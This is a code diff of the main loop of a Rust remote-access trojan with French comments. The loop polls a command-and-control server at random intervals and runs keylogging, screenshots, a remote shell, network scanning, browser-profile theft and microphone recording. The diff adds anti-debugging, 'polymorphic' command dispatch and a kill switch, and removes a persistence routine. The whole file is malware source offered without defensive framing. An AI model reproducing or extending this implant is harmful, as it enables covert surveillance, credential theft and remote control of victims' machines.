@@ -1,215 +1,96 @@
-// #![windows_subsystem = "windows"]
+mod anti_debug;
+mod browser_info;
 mod connexion;
 mod input;
+mod kill_switch;
 mod logs;
+mod mic_rec;
 mod network_scanner;
+mod poly;
 mod screenshot;
 mod shell;
+
 use rand::Rng;
-use tokio::task::JoinHandle;
-mod browser_info;
-mod mic_rec;
-mod persistance;
 use std::collections::HashSet;
-
-fn setup_persistence() {
-    #[cfg(target_os = "windows")]
-    {
-        let _ = persistance::setup_persistence_lolbin();
-    }
-
-    #[cfg(target_os = "linux")]
-    {
-        let _ = persistance::setup_persistence_linux();
-    }
-}
+use tokio::task::JoinHandle;
 
 #[tokio::main]
 async fn main() {
-    // setup_persistence();
+    poly::init_polymorph_functions();
+    
+    if let Some(cmd_map) = poly::get_command_map() {
+        let mapping = connexion::CommandMapping {
+            keylogger: cmd_map.get("keylogger").unwrap().clone(),
+            screenshot: cmd_map.get("screenshot").unwrap().clone(),
+            logs: cmd_map.get("logs").unwrap().clone(),
+            shell: cmd_map.get("shell").unwrap().clone(),
+            network_scan: cmd_map.get("network_scan").unwrap().clone(),
+            browser_info: cmd_map.get("browser_info").unwrap().clone(),
+            mic_rec: cmd_map.get("mic_rec").unwrap().clone(),
+        };
+        
+        if let Err(e) = connexion::send_mapping(&mapping).await {
+            eprintln!("Erreur envoi mapping: {}", e);
+        }
+    }
 
-    let mut active_tasks: Vec<JoinHandle<()>> = Vec::new();
-    let mut executed_directives: HashSet<String> = HashSet::new();
+    if kill_switch::check_ks().await {
+        eprintln!("Arrêt du programme : kill switch activé");
+        return;
+    }
+
+    let num_to_command = [
+        ("1", "keylogger"),
+        ("2", "screenshot"),
+        ("3", "logs"),
+        ("4", "network_scan"),
+        ("5", "browser_info"),
+        ("6", "mic_rec"),
+    ];
+    let mut stopped: HashSet<String> = HashSet::new();
+    let mut already_executed: HashSet<String> = HashSet::new();
+    let always_run = ["keylogger"];
 
     loop {
         match connexion::get_directives().await {
             Ok(commands) => {
                 println!("Commands received: {:?}", commands);
-
+                let mut handles: Vec<JoinHandle<()>> = Vec::new();
                 for command in commands {
-                    if executed_directives.contains(&command) {
+                    // Gestion du stop
+                    if let Some(num) = command.strip_prefix("stop ") {
+                        if let Some((_, cmd_name)) = num_to_command.iter().find(|(n, _)| *n == num) {
+                            println!("Arrêt demandé pour {}", cmd_name);
+                            stopped.insert(cmd_name.to_string());
+                            already_executed.remove(&cmd_name.to_string());
+                        } else {
+                            println!("Numéro de fonctionnalité inconnu pour stop: {}", num);
+                        }
                         continue;
                     }
-
-                    executed_directives.insert(command.clone());
-
-                    let handle = match command.as_str() {
-                        "keylogger" => tokio::spawn(async {
-                            println!("Démarrage du keylogger...");
-                            match input::start_keylogger(10).await {
-                                Ok(_) => {
-                                    println!("Keylogger terminé");
-                                    let _ = connexion::send_directive_status(
-                                        "keylogger",
-                                        "success",
-                                        "Terminé",
-                                    )
-                                    .await;
-                                }
-                                Err(e) => {
-                                    eprintln!("Erreur keylogger: {:?}", e);
-                                    let _ = connexion::send_directive_status(
-                                        "keylogger",
-                                        "error",
-                                        &format!("{:?}", e),
-                                    )
-                                    .await;
-                                }
-                            }
-                        }),
-                        "screenshot" => tokio::spawn(async {
-                            println!("Prise de screenshot...");
-                            match screenshot::take_screenshot().await {
-                                Ok(_) => {
-                                    println!("Screenshot terminé");
-                                    let _ = connexion::send_directive_status(
-                                        "screenshot",
-                                        "success",
-                                        "Terminé",
-                                    )
-                                    .await;
-                                }
-                                Err(e) => {
-                                    eprintln!("Erreur screenshot: {:?}", e);
-                                    let _ = connexion::send_directive_status(
-                                        "screenshot",
-                                        "error",
-                                        &format!("{:?}", e),
-                                    )
-                                    .await;
-                                }
-                            }
-                        }),
-                        "logs" => tokio::spawn(async {
-                            println!("Récupération des logs système...");
-                            match logs::get_sysinfo().await {
-                                Ok(_) => {
-                                    let _ = connexion::send_directive_status(
-                                        "logs", "success", "Terminé",
-                                    )
-                                    .await;
-                                }
-                                Err(e) => {
-                                    eprintln!("Erreur logs: {:?}", e);
-                                    let _ = connexion::send_directive_status(
-                                        "logs",
-                                        "error",
-                                        &format!("{:?}", e),
-                                    )
-                                    .await;
-                                }
-                            }
-                        }),
-                        "shell" => tokio::spawn(async {
-                            println!("Démarrage du shell distant");
-                            match shell::launch_shell().await {
-                                Ok(_) => {
-                                    let _ = connexion::send_directive_status(
-                                        "shell",
-                                        "success",
-                                        "Session shell terminée",
-                                    )
-                                    .await;
-                                }
-                                Err(e) => {
-                                    eprintln!("Erreur shell : {}", e);
-                                    let _ = connexion::send_directive_status(
-                                        "shell",
-                                        "error",
-                                        &format!("Erreur shell : {:?}", e),
-                                    )
-                                    .await;
-                                }
-                            }
-                        }),
-                        "network_scan" => tokio::spawn(async {
-                            println!("Démarrage du scanner de réseau");
-                            match network_scanner::scan_all_ports().await {
-                                Ok(_) => {
-                                    let _ = connexion::send_directive_status(
-                                        "network_scan",
-                                        "success",
-                                        "Terminé",
-                                    )
-                                    .await;
-                                }
-                                Err(e) => {
-                                    eprintln!("Erreur network_scan : {}", e);
-                                    let _ = connexion::send_directive_status(
-                                        "network_scan",
-                                        "error",
-                                        &format!("Erreur  : {:?}", e),
-                                    )
-                                    .await;
-                                }
-                            }
-                        }),
-                        "browser_info" => tokio::spawn(async {
-                            println!("Démarrage de récupération de profils");
-                            match browser_info::process_browser_profiles().await {
-                                Ok(_) => {
-                                    let _ = connexion::send_directive_status(
-                                        "browser_info",
-                                        "success",
-                                        "Terminé",
-                                    )
-                                    .await;
-                                }
-                                Err(e) => {
-                                    eprintln!("Erreur browser_info : {}", e);
-                                    let _ = connexion::send_directive_status(
-                                        "browser_info",
-                                        "error",
-                                        &format!("Erreur  : {:?}", e),
-                                    )
-                                    .await;
-                                }
-                            }
-                        }),
-                        "mic_rec" => tokio::spawn(async {
-                            println!("Démarrage de l'enregistrement micro");
-                            match mic_rec::record_mic().await {
-                                Ok(_) => {
-                                    let _ = connexion::send_directive_status(
-                                        "mic_rec", "success", "Terminé",
-                                    )
-                                    .await;
-                                }
-                                Err(e) => {
-                                    eprintln!("Erreur mic_rec : {}", e);
-                                    let _ = connexion::send_directive_status(
-                                        "mic_rec",
-                                        "error",
-                                        &format!("Erreur  : {:?}", e),
-                                    )
-                                    .await;
-                                }
-                            }
-                        }),
-                        _ => {
-                            println!("Commande inconnue: {}", command);
-                            continue;
-                        }
-                    };
-
-                    active_tasks.push(handle);
+                    if stopped.contains(&command) {
+                        println!("Commande stoppée ignorée: {}", command);
+                        continue;
+                    }
+                    // Exécuter toujours les commandes de always_run
+                    if !always_run.contains(&command.as_str()) && already_executed.contains(&command) {
+                        continue;
+                    }
+                    if !always_run.contains(&command.as_str()) {
+                        already_executed.insert(command.clone());
+                    }
+                    let cmd = command.clone();
+                    let handle = tokio::spawn(async move {
+                        poly::execute_poly_command(&cmd).await;
+                    });
+                    handles.push(handle);
+                }
+                for handle in handles {
+                    tokio::spawn(handle).await.ok();
                 }
             }
             Err(e) => eprintln!("Erreur avec la connexion au C2: {}", e),
         }
-
-        active_tasks.retain(|handle| !handle.is_finished());
-
         let delay = rand::rng().random_range(5..15);
         tokio::time::sleep(std::time::Duration::from_secs(delay)).await;
     }
